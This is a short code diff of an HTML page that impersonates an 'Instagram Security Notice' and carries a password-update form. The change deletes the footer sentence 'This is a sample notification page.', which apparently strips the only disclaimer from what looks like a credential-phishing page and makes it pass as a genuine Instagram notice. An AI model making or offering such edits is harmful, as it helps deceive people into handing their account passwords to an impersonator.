@@ -29,7 +29,7 @@ Be Aware
       <button class="btn" type="submit">Update Password</button>
     </form>
     <div class="footer">
-      This is a sample notification page. For your security, always use the official Instagram app or website to update your password.<br>
+      For your security, always use the official Instagram app or website to update your password.<br>
       &copy; 2025 Instagram Security Notice
     </div>
   </div>
